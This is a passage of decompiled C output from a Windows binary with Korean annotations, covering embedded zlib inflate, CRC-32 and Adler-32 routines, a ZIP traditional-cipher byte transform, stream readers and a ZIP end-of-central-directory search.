// Signature: unknown_signature
// ---------------
int __cdecl InflateHuffmanBlock_40514D(int a1, int a2, int a3, int a4, _DWORD *a5, _DWORD *a6)
{
  _DWORD *v6; // esi zlib 또는 DEFLATE 알고리즘에서의 inflate 단계 
  _BYTE *v8; // ecx 동적 허프만 블록을 해석하여 실제 데이터를 복원하는 로직 
  unsigned int j; // edx
  unsigned int v10; // eax
  int v11; // eax
  unsigned __int8 *v12; // eax
  bool i; // zf
  unsigned __int8 v14; // cl
  int v15; // esi
  unsigned int v16; // edx
  int v17; // ebx
  int v18; // eax
  int v19; // ecx
  int v20; // ecx
  unsigned int v21; // ebx
  int v22; // esi
  _BYTE *v23; // ecx
  _BYTE *v24; // eax
  unsigned int v25; // esi
  int v26; // esi
  _BYTE *v27; // esi
  _BYTE *v28; // eax
  _BYTE *v29; // eax
  _BYTE *v30; // ecx
  unsigned int v31; // ecx
  int result; // eax
  unsigned __int8 *v33; // edx
  int v34; // [esp-4h] [ebp-28h]
  int v35; // [esp+Ch] [ebp-18h]
  int v36; // [esp+10h] [ebp-14h]
  unsigned int v37; // [esp+14h] [ebp-10h]
  _BYTE *v38; // [esp+18h] [ebp-Ch]
  unsigned __int8 *v39; // [esp+1Ch] [ebp-8h]
  unsigned __int8 *v40; // [esp+1Ch] [ebp-8h]
  unsigned int v41; // [esp+20h] [ebp-4h]
  int v42; // [esp+2Ch] [ebp+8h]
  unsigned int v43; // [esp+2Ch] [ebp+8h]
  int v44; // [esp+2Ch] [ebp+8h]
  unsigned int v45; // [esp+2Ch] [ebp+8h]
  unsigned int v46; // [esp+2Ch] [ebp+8h]
  int v47; // [esp+30h] [ebp+Ch]
  unsigned int v48; // [esp+40h] [ebp+1Ch]
  unsigned int v49; // [esp+40h] [ebp+1Ch]

  v6 = a5;
  v8 = a5[13];
  j = a5[7];
  v38 = v8;
  v39 = *a6;
  v41 = a6[1];
  v48 = a5[8];
  v10 = a5[12];
  if ( v8 >= v10 )
    v11 = a5[11] - v8;
  else
    v11 = v10 - v8 - 1;
  v37 = v11;
  v36 = dword_40BCA8[a1];
  v47 = dword_40BCA8[a2];
LABEL_5:
  while ( j < 0x14 )
  {
    --v41;
    v48 |= *v39++ << j;
    j += 8;
  }
  v12 = (a3 + 8 * (v48 & v36));
  v42 = *v12;
  for ( i = v42 == 0; ; i = v42 == 0 )
  {
    v14 = v12[1];
    if ( i )
    {
      v48 >>= v14;
      j -= v12[1];
      v30 = v38++;
      --v37;
      *v30 = v12[4];
LABEL_38:
      if ( v37 < 0x102 || v41 < 0xA )
      {
        v31 = a6[1] - v41;
        if ( j >> 3 < v31 )
          v31 = j >> 3;
        result = 0;
        goto LABEL_55;
      }
      goto LABEL_5;
    }
    v48 >>= v14;
    j -= v12[1];
    if ( (v42 & 0x10) != 0 )
      break;
    if ( (v42 & 0x40) != 0 )
    {
      if ( (v42 & 0x20) != 0 )
      {
        v31 = a6[1] - v41;
        if ( j >> 3 < v31 )
          v31 = j >> 3;
        v34 = 1;
      }
      else
      {
        v31 = a6[1] - v41;
        a6[6] = "invalid literal/length code";
        if ( j >> 3 < v31 )
          v31 = j >> 3;
        v34 = -3;
      }
      result = v34;
      goto LABEL_55;
    }
    v12 += 8 * *(v12 + 1) + 8 * (v48 & dword_40BCA8[v42]);
    v42 = *v12;
  }
  v15 = v48 & dword_40BCA8[v42 & 0xF];
  v49 = v48 >> (v42 & 0xF);
  v16 = j - (v42 & 0xF);
  v43 = *(v12 + 1) + v15;
  while ( v16 < 0xF )
  {
    --v41;
    v49 |= *v39++ << v16;
    v16 += 8;
  }
  v17 = *(a4 + 8 * (v49 & v47));
  v18 = a4 + 8 * (v49 & v47);
  v48 = v49 >> *(v18 + 1);
  for ( j = v16 - *(v18 + 1); ; j -= v20 )
  {
    if ( (v17 & 0x10) != 0 )
    {
      v21 = v17 & 0xF;
      while ( j < v21 )
      {
        --v41;
        v48 |= *v39++ << j;
        j += 8;
      }
      v22 = v48 & dword_40BCA8[v21];
      j -= v21;
      v48 >>= v21;
      v23 = v38;
      v37 -= v43;
      v24 = &v38[-*(v18 + 4) - v22];
      v25 = a5[10];
      if ( v24 >= v25 )
      {
        *v38 = *v24;
        v38[1] = v24[1];
        v23 = v38 + 2;
        v29 = v24 + 2;
        v46 = v43 - 2;
        do
        {
          *v23++ = *v29++;
          --v46;
        }
        while ( v46 );
      }
      else
      {
        v35 = a5[11];
        do
          v24 += v35 - v25;
        while ( v24 < v25 );
        v26 = v35 - v24;
        if ( v43 <= v35 - v24 )
        {
          *v38 = *v24;
          v38[1] = v24[1];
          v23 = v38 + 2;
          v28 = v24 + 2;
          v45 = v43 - 2;
          do
          {
            *v23++ = *v28++;
            --v45;
          }
          while ( v45 );
        }
        else
        {
          v44 = v43 - v26;
          do
          {
            *v23++ = *v24++;
            --v26;
          }
          while ( v26 );
          v27 = a5[10];
          do
          {
            *v23++ = *v27++;
            --v44;
          }
          while ( v44 );
        }
      }
      v6 = a5;
      v38 = v23;
      goto LABEL_38;
    }
    if ( (v17 & 0x40) != 0 )
      break;
    v19 = *(v18 + 4) + (v48 & dword_40BCA8[v17]);
    v17 = *(v18 + 8 * v19);
    v18 += 8 * v19;
    v20 = *(v18 + 1);
    v48 >>= v20;
  }
  v31 = a6[1] - v41;
  a6[6] = "invalid distance code";
  if ( j >> 3 < v31 )
    v31 = j >> 3;
  v6 = a5;
  result = -3;
LABEL_55:
  v40 = &v39[-v31];
  v6[8] = v48;
  v6[7] = j - 8 * v31;
  a6[1] = v41 + v31;
  v33 = &v40[-*a6];
  *a6 = v40;
  a6[2] += v33;
  v6[13] = v38;
  return result;
}


// --- Metadata ---
// Function Name: computeCRC32_40541F
// Address: 0x40541F
// Signature: unknown_signature
// ---------------
unsigned int __cdecl computeCRC32_40541F(int a1, unsigned __int8 *a2, unsigned int a3)
{
  unsigned __int8 *v3; // edx
  unsigned int v5; // eax
  unsigned int v6; // edi
  unsigned int v7; // eax
  unsigned __int8 *v8; // edx
  int v9; // ebx
  unsigned int v10; // esi
  int v11; // eax
  int v12; // ebx
  unsigned int v13; // eax
  int v14; // esi
  int v15; // ebx
  unsigned int v16; // esi
  int v17; // eax
  int v18; // ebx
  unsigned int v19; // eax
  int v20; // esi
  int v21; // ebx
  unsigned int v22; // esi
  unsigned int v23; // eax

  v3 = a2;
  if ( !a2 )
    return 0;
  v5 = ~a1;
  if ( a3 >= 8 )                                // 계산된 CRC-32 체크섬 반환 
  {
    v6 = a3 >> 3;
    do
    {
      a3 -= 8;
      v7 = (v5 >> 8) ^ dword_40D054[*v3 ^ v5];
      v8 = v3 + 1;
      v9 = v8[1];
      v10 = (v7 >> 8) ^ dword_40D054[*v8++ ^ v7];
      v11 = v9 ^ v10;
      v12 = v8[1];
      v13 = (v10 >> 8) ^ dword_40D054[v11];
      ++v8;
      v14 = v12 ^ v13;
      v15 = v8[1];
      v16 = (v13 >> 8) ^ dword_40D054[v14];
      ++v8;
      v17 = v15 ^ v16;
      v18 = v8[1];
      v19 = (v16 >> 8) ^ dword_40D054[v17];
      ++v8;
      v20 = v18 ^ v19;
      v21 = v8[1];
      v22 = (v19 >> 8) ^ dword_40D054[v20];
      ++v8;
      v23 = (v22 >> 8) ^ dword_40D054[v21 ^ v22];
      v5 = dword_40D054[v8[1] ^ v23] ^ (v23 >> 8);
      v3 = v8 + 2;
      --v6;
    }
    while ( v6 );
  }
  for ( ; a3; --a3 )
    v5 = dword_40D054[*v3++ ^ v5] ^ (v5 >> 8);
  return ~v5;
}


// --- Metadata ---
// Function Name: updateStreamState_405535
// Address: 0x405535
// Signature: unknown_signature
// ---------------
int __cdecl updateStreamState_405535(int *unit, unsigned __int8 a2)
{
  int nextCRCstate; // eax
  unsigned int v3; // esi
  unsigned int seedLCG; // eax
  int CRClike; // eax

  nextCRCstate = (*unit >> 8) ^ dword_40D054[a2 ^ *unit];
  v3 = unit[2];
  *unit = nextCRCstate;
  seedLCG = 134775813 * (unit[1] + nextCRCstate) + 1;
  unit[1] = seedLCG;
  CRClike = (v3 >> 8) ^ dword_40D054[v3 ^ HIBYTE(seedLCG)];
  unit[2] = CRClike;
  return CRClike;
}


// --- Metadata ---
// Function Name: getNextStreamByte_405588
// Address: 0x405588
// Signature: unknown_signature
// ---------------
int __cdecl getNextStreamByte_405588(int a1)
{
  int v1; // eax

  v1 = *(a1 + 8) & 0xFFFD;
  LOBYTE(v1) = v1 | 2;
  return (v1 * (v1 ^ 1)) >> 8;                  // 다음값 반환, 난수like 값
}


// --- Metadata ---
// Function Name: EncryptByteWithState_4055A3
// Address: 0x4055A3
// Signature: unknown_signature
// ---------------
unsigned __int8 __cdecl EncryptByteWithState_4055A3(int *a1, char targetbyte)
{
  unsigned __int8 targetbytea; // [esp+Ch] [ebp+Ch]

  targetbytea = getNextStreamByte_405588(a1) ^ targetbyte;// 상태 기반 스트림 암호화 수행 
  updateStreamState_405535(a1, targetbytea);
  return targetbytea;
}


// --- Metadata ---
// Function Name: calculateAdler32Hash_4055C4
// Address: 0x4055C4
// Signature: unknown_signature
// ---------------
unsigned int __cdecl calculateAdler32Hash_4055C4(unsigned int adler, unsigned __int8 *data, unsigned int len)
{
  unsigned __int8 *v3; // ecx
  unsigned int v4; // esi
  unsigned int v5; // edi
  unsigned int v7; // edx
  unsigned int v8; // eax
  int v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // edi
  int v17; // esi
  int v18; // edi
  int v19; // esi
  int v20; // edi
  int v21; // esi
  int v22; // edi
  int v23; // esi
  int v24; // edi
  int v25; // esi
  int v26; // edi
  int v27; // esi
  int v28; // edi
  int v29; // esi
  int v30; // edi
  int v31; // esi
  int v32; // edi
  int v33; // esi
  int v34; // edi
  int v35; // esi
  int v36; // edi
  int v37; // esi
  int v38; // edi

  v3 = data;
  v4 = adler;
  v5 = HIWORD(adler);
  if ( !data )
    return 1;
  for ( ; len; v5 %= 0xFFF1u )                  // Adler32 해시를 계산 - 널리 쓰이는 zlib 압축 라이브러리의 일부
  {
    v7 = 5552;
    if ( len < 0x15B0 )
      v7 = len;
    len -= v7;
    if ( v7 >= 16 )
    {
      v8 = v7 >> 4;
      v7 += -16 * (v7 >> 4);
      do
      {
        v9 = *v3 + v4;
        v10 = v9 + v5;
        v11 = v3[1] + v9;
        v12 = v11 + v10;
        v13 = v3[2] + v11;
        v14 = v13 + v12;
        v15 = v3[3] + v13;
        v16 = v15 + v14;
        v17 = v3[4] + v15;
        v18 = v17 + v16;
        v19 = v3[5] + v17;
        v20 = v19 + v18;
        v21 = v3[6] + v19;
        v22 = v21 + v20;
        v23 = v3[7] + v21;
        v24 = v23 + v22;
        v25 = v3[8] + v23;
        v26 = v25 + v24;
        v27 = v3[9] + v25;
        v28 = v27 + v26;
        v29 = v3[10] + v27;
        v30 = v29 + v28;
        v31 = v3[11] + v29;
        v32 = v31 + v30;
        v33 = v3[12] + v31;
        v34 = v33 + v32;
        v35 = v3[13] + v33;
        v36 = v35 + v34;
        v37 = v3[14] + v35;
        v38 = v37 + v36;
        v4 = v3[15] + v37;
        v5 = v4 + v38;
        v3 += 16;
        --v8;
      }
      while ( v8 );
    }
    for ( ; v7; --v7 )
    {
      v4 += *v3++;
      v5 += v4;
    }
    v4 %= 0xFFF1u;
  }
  return v4 | (v5 << 16);
}


// --- Metadata ---
// Function Name: callocWrapper_4056DD
// Address: 0x4056DD
// Signature: unknown_signature
// ---------------
void *__cdecl callocWrapper_4056DD(int a1, size_t Count, size_t Size)
{
  return calloc(Count, Size);
}


// --- Metadata ---
// Function Name: freeWrapper_4056EE
// Address: 0x4056EE
// Signature: unknown_signature
// ---------------
void __cdecl freeWrapper_4056EE(int a1, void *Block)
{
  free(Block);
}


// --- Metadata ---
// Function Name: resetSession_4056FA
// Address: 0x4056FA
// Signature: unknown_signature
// ---------------
int __cdecl resetSession_4056FA(_DWORD *sessionContext)
{
  _DWORD *v1; // ecx

  if ( !sessionContext )                        // 전달받은 구조체를 초기화함 
    return -2;
  v1 = sessionContext[7];
  if ( !v1 )
    return -2;
  sessionContext[5] = 0;
  sessionContext[2] = 0;
  sessionContext[6] = 0;
  *v1 = v1[3] != 0 ? 7 : 0;
  initObject_4042C0(*(sessionContext[7] + 20), sessionContext, 0);
  return 0;
}


// --- Metadata ---
// Function Name: cleanUpSession_405739
// Address: 0x405739
// Signature: unknown_signature
// ---------------
int __cdecl cleanUpSession_405739(_DWORD *a1)
{
  int v1; // eax
  _DWORD *v2; // eax

  if ( !a1 )
    return -2;
  v1 = a1[7];
  if ( !v1 || !a1[9] )                          // 세션/객체 해제, 구조체 해제(콜백 정리) 
    return -2;
  v2 = *(v1 + 20);
  if ( v2 )
    freeObject_404BE5(v2, a1);
  (a1[9])(a1[10], a1[7]);
  a1[7] = 0;
  return 0;
}


// --- Metadata ---
// Function Name: InitSession_405777
// Address: 0x405777
// Signature: unknown_signature
// ---------------
BOOL __stdcall InitSession_405777(DWORD session)
{
  bool v1; // zf
  int v2; // eax

  if ( !"1.1.3" )                               // 압축/해제 세션 객체 설정 준비 
    return -6;
  if ( !session )                               // 세션 객체 검증 
    return -2;
  v1 = *(session + 32) == 0;
  *(session + 24) = 0;
  if ( v1 )                                     // 메모리 할당 
  {
    *(session + 32) = callocWrapper_4056DD;
    *(session + 40) = 0;
  }
  if ( !*(session + 36) )
    *(session + 36) = freeWrapper_4056EE;
  v2 = (*(session + 32))(*(session + 40), 1, 24);// 세션 구조체 할당 
  *(session + 28) = v2;
  if ( v2 )                                     // 구조체 필드 설정 
  {
    *(v2 + 20) = 0;
    *(*(session + 28) + 12) = 0;
    *(*(session + 28) + 12) = 1;
    *(*(session + 28) + 16) = 15;
    *(*(session + 28) + 20) = CreateSessionContext_40432B(
                                session,
                                *(*(session + 28) + 12) == 0 ? calculateAdler32Hash_4055C4 : 0,
                                0x8000);        // 내부 버퍼 및 해시 설정 
    if ( *(*(session + 28) + 20) )              // 성공 시 추가 초기화 
    {
      resetSession_4056FA(session);
      return 0;
    }
    cleanUpSession_405739(session);             // 실패 시 정리 
  }
  return -4;
}


// --- Metadata ---
// Function Name: inflateStream_40583C
// Address: 0x40583C
// Signature: unknown_signature
// ---------------
int __cdecl inflateStream_40583C(void *z_stream, int flag)
{
  int *v2; // eax zlib inflate 상태 기계에 기반한 압축 해제 과정 
  int v3; // ebx
  int v4; // ecx
  int v5; // ecx
  _DWORD *v6; // eax
  int v7; // ecx
  int v8; // eax
  _DWORD *v9; // ecx
  int v10; // ebx
  int v11; // eax
  int v12; // eax
  _DWORD *v13; // eax
  int v14; // eax
  int v15; // ecx
  _DWORD *v16; // eax
  int v17; // eax
  unsigned __int8 *v18; // ecx
  _DWORD *v19; // eax
  int v20; // eax
  unsigned __int8 *v21; // ecx
  _DWORD *v22; // eax
  int v23; // eax
  unsigned __int8 *v24; // ecx
  _DWORD *v25; // eax
  int v27; // eax
  int v28; // ecx
  _DWORD *v29; // eax
  int v30; // eax
  unsigned __int8 *v31; // ecx
  _DWORD *v32; // eax
  int v33; // eax
  unsigned __int8 *v34; // ecx
  _DWORD *v35; // eax
  int v36; // eax
  unsigned __int8 *v37; // ecx
  _DWORD *v38; // eax
  int v39; // eax
  int v40; // [esp-4h] [ebp-10h]
  int flaga; // [esp+18h] [ebp+Ch]

  if ( !z_stream )
    return -2;
  v2 = *(z_stream + 7);
  if ( !v2 || !*z_stream )
    return -2;
  v3 = -5;
  if ( flag == 4 )
    flaga = -5;
  else
    flaga = 0;
  v4 = *v2;
  while ( 2 )
  {
    switch ( v4 )
    {
      case 0:
        v5 = *(z_stream + 1);
        if ( !v5 )
          return v3;
        ++*(z_stream + 2);
        *(z_stream + 1) = v5 - 1;
        v3 = flaga;
        v2[1] = **z_stream;
        v6 = *(z_stream + 7);
        v7 = v6[1] & 0xF;
        ++*z_stream;
        if ( v7 != 8 )
        {
          *v6 = 13;
          *(z_stream + 6) = "unknown compression method";
          goto LABEL_37;
        }
        if ( ((v6[1] >> 4) + 8) > v6[4] )
        {
          *v6 = 13;
          *(z_stream + 6) = "invalid window size";
          goto LABEL_37;
        }
        *v6 = 1;
LABEL_15:
        v8 = *(z_stream + 1);
        if ( !v8 )
          return v3;
        ++*(z_stream + 2);
        *(z_stream + 1) = v8 - 1;
        v9 = *(z_stream + 7);
        v10 = *(*z_stream)++;
        if ( (v10 + (v9[1] << 8)) % 0x1Fu )
        {
          v3 = flaga;
          *v9 = 13;
          v11 = *(z_stream + 7);
          *(z_stream + 6) = "incorrect header check";
          *(v11 + 4) = 5;
        }
        else
        {
          if ( (v10 & 0x20) != 0 )
          {
            v3 = flaga;
            **(z_stream + 7) = 2;
LABEL_41:
            v27 = *(z_stream + 1);
            if ( v27 )
            {
              ++*(z_stream + 2);
              v28 = *(z_stream + 7);
              *(z_stream + 1) = v27 - 1;
              v3 = flaga;
              *(v28 + 8) = **z_stream << 24;
              v29 = *(z_stream + 7);
              ++*z_stream;
              *v29 = 3;
LABEL_43:
              v30 = *(z_stream + 1);
              if ( v30 )
              {
                v31 = *z_stream;
                ++*(z_stream + 2);
                *(z_stream + 1) = v30 - 1;
                v3 = flaga;
                *(*(z_stream + 7) + 8) += *v31 << 16;
                v32 = *(z_stream + 7);
                ++*z_stream;
                *v32 = 4;
LABEL_45:
                v33 = *(z_stream + 1);
                if ( v33 )
                {
                  v34 = *z_stream;
                  ++*(z_stream + 2);
                  *(z_stream + 1) = v33 - 1;
                  v3 = flaga;
                  *(*(z_stream + 7) + 8) += *v34 << 8;
                  v35 = *(z_stream + 7);
                  ++*z_stream;
                  *v35 = 5;
LABEL_47:
                  v36 = *(z_stream + 1);
                  if ( v36 )
                  {
                    v37 = *z_stream;
                    ++*(z_stream + 2);
                    *(z_stream + 1) = v36 - 1;
                    v40 = 2;
                    *(*(z_stream + 7) + 8) += *v37;
                    v38 = *(z_stream + 7);
                    ++*z_stream;
                    *(z_stream + 12) = v38[2];
                    *v38 = 6;
                    return v40;
                  }
                }
              }
            }
            return v3;
          }
          v3 = flaga;
          *v9 = 7;
        }
        goto LABEL_38;
      case 1:
        goto LABEL_15;
      case 2:
        goto LABEL_41;
      case 3:
        goto LABEL_43;
      case 4:
        goto LABEL_45;
      case 5:
        goto LABEL_47;
      case 6:
        **(z_stream + 7) = 13;
        v39 = *(z_stream + 7);
        *(z_stream + 6) = "need dictionary";
        *(v39 + 4) = 0;
        return -2;
      case 7:
        v12 = inflateCompressedBlock_4043B6(v2[5], z_stream, v3);
        v3 = v12;
        if ( v12 == -3 )
        {
          **(z_stream + 7) = 13;
          *(*(z_stream + 7) + 4) = 0;
          goto LABEL_38;
        }
        if ( !v12 )
          v3 = flaga;
        if ( v3 != 1 )
          return v3;
        v3 = flaga;
        initObject_4042C0(*(*(z_stream + 7) + 20), z_stream, (*(z_stream + 7) + 4));
        v13 = *(z_stream + 7);
        if ( v13[3] )
        {
          *v13 = 12;
          goto LABEL_38;
        }
        *v13 = 8;
LABEL_28:
        v14 = *(z_stream + 1);
        if ( !v14 )
          return v3;
        ++*(z_stream + 2);
        v15 = *(z_stream + 7);
        *(z_stream + 1) = v14 - 1;
        v3 = flaga;
        *(v15 + 8) = **z_stream << 24;
        v16 = *(z_stream + 7);
        ++*z_stream;
        *v16 = 9;
LABEL_30:
        v17 = *(z_stream + 1);
        if ( !v17 )
          return v3;
        v18 = *z_stream;
        ++*(z_stream + 2);
        *(z_stream + 1) = v17 - 1;
        v3 = flaga;
        *(*(z_stream + 7) + 8) += *v18 << 16;
        v19 = *(z_stream + 7);
        ++*z_stream;
        *v19 = 10;
LABEL_32:
        v20 = *(z_stream + 1);
        if ( !v20 )
          return v3;
        v21 = *z_stream;
        ++*(z_stream + 2);
        *(z_stream + 1) = v20 - 1;
        v3 = flaga;
        *(*(z_stream + 7) + 8) += *v21 << 8;
        v22 = *(z_stream + 7);
        ++*z_stream;
        *v22 = 11;
LABEL_34:
        v23 = *(z_stream + 1);
        if ( !v23 )
          return v3;
        v24 = *z_stream;
        ++*(z_stream + 2);
        *(z_stream + 1) = v23 - 1;
        v3 = flaga;
        *(*(z_stream + 7) + 8) += *v24;
        v25 = *(z_stream + 7);
        ++*z_stream;
        if ( v25[1] != v25[2] )
        {
          *v25 = 13;
          *(z_stream + 6) = "incorrect data check";
LABEL_37:
          *(*(z_stream + 7) + 4) = 5;
LABEL_38:
          v2 = *(z_stream + 7);
          v4 = *v2;
          continue;
        }
        **(z_stream + 7) = 12;
        return 1;
      case 8:
        goto LABEL_28;
      case 9:
        goto LABEL_30;
      case 10:
        goto LABEL_32;
      case 11:
        goto LABEL_34;
      case 12:
        return 1;
      case 13:
        return -3;
      default:
        return -2;
    }
  }
}


// --- Metadata ---
// Function Name: CreateFileReaderContext_405BAE
// Address: 0x405BAE
// Signature: unknown_signature
// ---------------
_BYTE *__cdecl CreateFileReaderContext_405BAE(LPCSTR lpFileName, int a2, int mode, int a4)
{
  void *v4; // edi
  _BYTE *v6; // eax
  _BYTE *v7; // esi
  bool v8; // [esp+Eh] [ebp-2h]
  char v9; // [esp+Fh] [ebp-1h]

  if ( mode != 1 && mode != 2 && mode != 3 )
  {
    *a4 = 0x10000;
    return 0;
  }
  v4 = 0;
  v8 = 0;
  *a4 = 0;
  v9 = 0;
  if ( mode == 1 )                              // 메모리 포인터 처리 
  {
    v4 = lpFileName;
    v9 = 0;
  }
  else
  {
    if ( mode != 2 )
      goto LABEL_13;
    v4 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);// 파일 열기 
    if ( v4 == -1 )
    {
      *a4 = 512;
      return 0;
    }
    v9 = 1;
  }
  v8 = SetFilePointer(v4, 0, 0, 1u) != -1;
LABEL_13:
  v6 = operator new(0x20u);                     // 구조체 할당 및 메모리 초기화 
  v7 = v6;
  if ( mode == 1 || mode == 2 )
  {
    *v6 = 1;
    v6[16] = v9;
    v6[1] = v8;
    *(v6 + 1) = v4;
    v6[8] = 0;
    *(v6 + 3) = 0;
    if ( v8 )
      *(v6 + 3) = SetFilePointer(v4, 0, 0, 1u);
  }
  else
  {
    *v6 = 0;
    *(v6 + 5) = lpFileName;
    v6[1] = 1;
    v6[16] = 0;
    *(v6 + 6) = a2;
    *(v6 + 7) = 0;
    *(v6 + 3) = 0;
  }
  *a4 = 0;
  return v7;
}


// --- Metadata ---
// Function Name: FreeZipEntryStream_405C9F
// Address: 0x405C9F
// Signature: unknown_signature
// ---------------
int __cdecl FreeZipEntryStream_405C9F(void *entryStream)
{
  if ( !entryStream )                           // 객체 메모리 정리 
    return -1;
  if ( *(entryStream + 16) )
    CloseHandle(*(entryStream + 1));
  operator delete(entryStream);
  return 0;
}


// --- Metadata ---
// Function Name: isReaderValid_405CC7
// Address: 0x405CC7
// Signature: unknown_signature
// ---------------
BOOL __cdecl isReaderValid_405CC7(_BYTE *a1)
{
  return *a1 && a1[8];                          // 입력 객체 유효 상태 점검 
}


// --- Metadata ---
// Function Name: GetStreamOffset_405CDD
// Address: 0x405CDD
// Signature: unknown_signature
// ---------------
DWORD __cdecl GetStreamOffset_405CDD(int streamPtr)
{
  DWORD result; // eax

  if ( !*streamPtr )                            // 메모리 블록 모드 
    goto LABEL_6;
  if ( *(streamPtr + 1) )
    return SetFilePointer(*(streamPtr + 4), 0, 0, 1u) - *(streamPtr + 12);// 현재 커서 위치 - 시작 오프셋 
  if ( *streamPtr )
    result = 0;
  else
LABEL_6:
    result = *(streamPtr + 28);
  return result;
}


// --- Metadata ---
// Function Name: SeekStreamOffset_405D0E
// Address: 0x405D0E
// Signature: unknown_signature
// ---------------
int __cdecl SeekStreamOffset_405D0E(int streamObject, LONG offset, int origin)
{
  LONG v4; // ecx
  DWORD v5; // [esp-4h] [ebp-4h]

  if ( !*streamObject )                         // 파일 또는 메모리 스트림의 현재 위치 이동 시키기 
    goto MEMORY_STREAM_LABEL;
  if ( !*(streamObject + 1) )
  {
    if ( *streamObject )
      return 29;
MEMORY_STREAM_LABEL:
    if ( origin )
    {
      if ( origin == 1 )                        // FILE Current 
      {
        *(streamObject + 28) += offset;
        return 0;
      }
      if ( origin != 2 )                        // FILE End
        return 0;
      v4 = offset + *(streamObject + 24);
    }
    else                                        // FILE Begin 
    {
      v4 = offset;
    }
    *(streamObject + 28) = v4;
    return 0;
  }
  if ( origin )
  {
    if ( origin == 1 )
    {
      v5 = 1;
FILE_SEEK_LABEL:                                // 파일 스트림 처리 
      SetFilePointer(*(streamObject + 4), offset, 0, v5);
      return 0;
    }
    if ( origin == 2 )
    {
      v5 = 2;
      goto FILE_SEEK_LABEL;
    }
    return 19;
  }
  SetFilePointer(*(streamObject + 4), offset + *(streamObject + 12), 0, 0);
  return 0;
}


// --- Metadata ---
// Function Name: readFromReader_405D8A
// Address: 0x405D8A
// Signature: unknown_signature
// ---------------
unsigned int __cdecl readFromReader_405D8A(LPVOID lpBuffer, int a2, int a3, int a4)
{
  int v4; // esi
  size_t v5; // edi
  unsigned int v6; // eax
  int v7; // ecx
  unsigned int v8; // eax

  v4 = a4;
  v5 = a3 * a2;
  if ( *a4 )
  {
    if ( !ReadFile(*(a4 + 4), lpBuffer, a3 * a2, &lpBuffer, 0) )// 파일 또는 메모리에서 바이트 읽기 작업 
      *(v4 + 8) = 1;
    v6 = lpBuffer;
  }
  else
  {
    v7 = *(a4 + 28);
    v8 = *(a4 + 24);
    if ( v7 + v5 > v8 )
      v5 = v8 - v7;
    memcpy(lpBuffer, (v7 + *(a4 + 20)), v5);
    *(v4 + 28) += v5;
    v6 = v5;
  }
  return v6 / a2;
}


// --- Metadata ---
// Function Name: readByte_405DEF
// Address: 0x405DEF
// Signature: unknown_signature
// ---------------
int __cdecl readByte_405DEF(_BYTE *a1, _DWORD *a2)
{
  int v2; // ecx
  unsigned __int8 Buffer; // [esp+1h] [ebp-1h] BYREF

  Buffer = HIBYTE(v2);
  if ( readFromReader_405D8A(&Buffer, 1, 1, a1) != 1 )// Reader에서 1바이트씩 읽기
    return -isReaderValid_405CC7(a1);
  *a2 = Buffer;
  return 0;
}


// --- Metadata ---
// Function Name: readLE16_405E27
// Address: 0x405E27
// Signature: unknown_signature
// ---------------
int __cdecl readLE16_405E27(_BYTE *inputStream, _DWORD *resultPointer)
{
  int result; // eax
  int v3; // esi
  int v4; // [esp+4h] [ebp-4h] BYREF

  result = readByte_405DEF(inputStream, &v4);   // 리틀 엔디안 2바이트 디코딩 
  v3 = v4;
  if ( result || (result = readByte_405DEF(inputStream, &v4)) != 0 )
    *resultPointer = 0;
  else
    *resultPointer = v3 + (v4 << 8);
  return result;
}


// --- Metadata ---
// Function Name: ReadPointerFromStream_405E6B
// Address: 0x405E6B
// Signature: unknown_signature
// ---------------
int __cdecl ReadPointerFromStream_405E6B(_BYTE *readerPointer, _DWORD *resultPointer)
{
  _BYTE *v2; // esi
  int result; // eax
  _BYTE *v4; // edi
  _BYTE *v5; // edi
  _BYTE *v6; // edi

  v2 = readerPointer;
  result = readByte_405DEF(readerPointer, &readerPointer);// 리틀 엔디안 포인터 계산 
  v4 = readerPointer;
  if ( !result )
    result = readByte_405DEF(v2, &readerPointer);
  v5 = &v4[256 * readerPointer];
  if ( !result )
    result = readByte_405DEF(v2, &readerPointer);
  v6 = &v5[0x10000 * readerPointer];
  if ( result || (result = readByte_405DEF(v2, &readerPointer)) != 0 )// 읽은 4바이트를 리틀엔디안 포맷으로 주소 계산 
    *resultPointer = 0;
  else
    *resultPointer = &v6[0x1000000 * readerPointer];
  return result;                                // result = base + (byte0) + (byte1 << 8) + (byte2 << 16) + (byte3 << 24)
}


// --- Metadata ---
// Function Name: FindZipEOCDoffset_405EDF
// Address: 0x405EDF
// Signature: unknown_signature
// ---------------
int __cdecl FindZipEOCDoffset_405EDF(int stream)
{
  DWORD fileSize; // ecx
  int readSize; // edi
  void *readBuffer; // ebx
  int offsetIncrement; // eax
  unsigned int v6; // eax
  int sigSearchIndex; // eax
  int v8; // ecx
  DWORD v9; // [esp+8h] [ebp-10h]
  int eocdOffset; // [esp+Ch] [ebp-Ch]
  unsigned int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( SeekStreamOffset_405D0E(stream, 0, 2) )  // ZIP 파일의 끝에서 역방향으로 EOCD 시그니처를 탐색하여 오프셋을 반환 
    return -1;
  fileSize = GetStreamOffset_405CDD(stream);    // ZIP 파일 내 중앙 디렉터리 파싱의 진입점 확보 
  v9 = fileSize;
  v12 = 0xFFFF;
  if ( fileSize < 0xFFFF )
    v12 = fileSize;
  readSize = 1028;
  readBuffer = malloc(0x404u);
  if ( !readBuffer )
    return -1;
  eocdOffset = -1;
  offsetIncrement = 4;
  if ( v12 > 4 )
  {
    while ( 1 )
    {
      v6 = offsetIncrement + 1024;
      v11 = v12;
      if ( v6 <= v12 )
        v11 = v6;
      if ( v11 <= 0x404 )
        readSize = v11;
      if ( SeekStreamOffset_405D0E(stream, v9 - v11, 0) || readFromReader_405D8A(readBuffer, readSize, 1, stream) != 1 )
        break;
      sigSearchIndex = readSize - 3;
      while ( 1 )
      {
        v8 = sigSearchIndex--;
        if ( v8 < 0 )
          break;
        if ( *(readBuffer + sigSearchIndex) == 0x50
          && *(readBuffer + sigSearchIndex + 1) == 0x4B
          && *(readBuffer + sigSearchIndex + 2) == 5
          && *(readBuffer + sigSearchIndex + 3) == 6 )
        {
          eocdOffset = v9 - v11 + sigSearchIndex;
          break;
        }
      }
      if ( eocdOffset || v11 >= v12 )
        break;
      offsetIncrement = v11;
      readSize = 1028;
    }
  }
  free(readBuffer);
  return eocdOffset;
}


// --- Metadata ---
// Function Name: InitZipCentralDirectoryIterator_405FE2
